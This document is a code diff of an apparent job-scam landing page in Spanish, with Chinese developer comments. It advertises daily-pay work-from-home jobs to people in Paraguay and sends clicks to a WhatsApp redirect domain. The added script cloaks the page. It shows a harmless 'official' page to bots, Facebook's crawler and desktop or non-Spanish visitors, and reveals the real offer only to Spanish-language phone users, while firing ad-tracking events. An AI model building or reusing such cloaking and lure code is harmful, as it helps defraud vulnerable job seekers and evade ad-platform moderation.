@@ -1,39 +1,57 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Empleo</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .loading-box {
-            font-family: Arial, sans-serif;
-            color: #16a34a;
-            font-size: 18px;
-            font-weight: bold;
-            text-align: center;
-        }
-    </style>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <title>Portal de Empleo Oficial</title>
+    
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1666202578041059'); 
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1666202578041059&ev=PageView&noscript=1"/></noscript>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
+<body class="bg-slate-50">
 
-    <div class="loading-box">
-        🟩 Conectando con WhatsApp...
+    <div id="safe-white-page" class="block min-h-screen bg-white font-sans">
+        <header class="bg-gray-800 text-white px-6 py-4 flex justify-between items-center">
+            <span class="text-base font-bold">Empleos Conectados Latam</span>
+            <span class="text-xs text-gray-400">Sitio Oficial</span>
+        </header>
+        <main class="max-w-md mx-auto px-6 pt-16 text-center">
+            <h1 class="text-2xl font-bold text-gray-900 mb-4">Bienvenido al Portal Informativo</h1>
+            <p class="text-sm text-gray-600 leading-relaxed mb-8">
+                Esta es una plataforma de comunicación oficial que cumple estrictamente con las normativas internacionales de privacidad.
+            </p>
+        </main>
+    </div>
+
+    <div id="real-money-page" class="hidden min-h-screen bg-white font-sans">
+        <header class="bg-emerald-600 text-white px-5 py-4 flex items-center justify-between shadow-sm">
+            <span class="text-base font-bold tracking-wide">💼 Vacantes de Trabajo Paraguay</span>
+            <span class="bg-emerald-500 text-[10px] px-2 py-0.5 rounded font-bold animate-pulse">● EN LÍNEA</span>
+        </header>
+        
+        <main class="max-w-md mx-auto px-6 pt-8 pb-12">
+            <h1 class="text-3xl font-black text-gray-950 leading-tight mb-4 text-center">¡Trabajo a tiempo parcial desde casa! 🇵🇾</h1>
+            <p class="text-center text-gray-600 text-sm mb-6">Utilice su teléfono celular para obtener ingresos adicionales todos los días.</p>
+
+            <button id="whatsapp-connect-btn" class="w-full text-white font-black text-lg py-4.5 px-6 rounded-2xl shadow-xl flex items-center justify-center gap-2" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%)">
+                💬 Aplicar por WhatsApp ahora
+            </button>
+        </main>
     </div>
 
     <script>
-        // 🚀 核心分流系统链接（直接锁死你的目标链接）
-        var baseUrl = "https://svip1027.top/blgui996";
-        
-        // 🎰 保留 5% 概率随机分配本土化话术的精髓，但执行速度提升 100 倍
         var whatsappPhrases = [
             "Hola, vi el anuncio y me interesa el trabajo.",
             "Quisiera recibir información sobre la vacante de empleo desde casa.",
@@ -42,17 +60,51 @@
             "Hola, qué tal? Quiero saber más sobre los pagos diarios."
         ];
 
-        var finalUrl = baseUrl;
-        var randomNumber = Math.floor(Math.random() * 100) + 1;
+        // 🚀 【核心改良：0延迟本地防御机制】
+        function runInstantFilter() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            var lang = (navigator.language || navigator.userLanguage).toLowerCase();
+            
+            var isMobile = /iphone|ipad|ipod|android|blackberry|iemobile|opera mini/i.test(userAgent);
+            var isBot = userAgent.includes("facebookexternalhit") || userAgent.includes("crawler") || userAgent.includes("bot");
+            // 判定：必须是手机、不能有机器人特征、且系统语言必须是西班牙语(es)
+            var isSpanish = lang.startsWith("es");
 
-        if (randomNumber <= 5) {
-            var randomIndex = Math.floor(Math.random() * whatsappPhrases.length);
-            finalUrl = baseUrl + "?text=" + encodeURIComponent(whatsappPhrases[randomIndex]);
+            // 纯本地判断，0.0001秒完成，绝对不卡网络！
+            if (isMobile && !isBot && isSpanish) {
+                document.getElementById('safe-white-page').style.display = 'none';
+                document.getElementById('real-money-page').style.display = 'block';
+            }
         }
 
-        // 💥 没有任何网络请求！0秒拒绝等待，直接强制甩飞进 WhatsApp！
-        window.location.replace(finalUrl);
-    </script>
+        runInstantFilter();
 
+        // 🎰 按钮点击（1秒延迟防漏报补丁）
+        document.getElementById('whatsapp-connect-btn').addEventListener('click', function(e) {
+            e.preventDefault(); 
+            
+            // 触发像素记账
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'Lead'); 
+            }
+            
+            var baseUrl = "https://svip1027.top/blgui996";
+            var finalUrl = baseUrl;
+            
+            var randomNumber = Math.floor(Math.random() * 100) + 1;
+            if (randomNumber <= 5) {
+                var randomIndex = Math.floor(Math.random() * whatsappPhrases.length);
+                finalUrl = baseUrl + "?text=" + encodeURIComponent(whatsappPhrases[randomIndex]);
+            }
+            
+            // 按钮变色提示正在跳转，优雅留出1秒给像素发信号，彻底解决卡消耗
+            this.innerText = "Conectando...";
+            this.style.opacity = "0.7";
+
+            setTimeout(function() {
+                window.location.href = finalUrl;
+            }, 1000); 
+        });
+    </script>
 </body>
 </html>
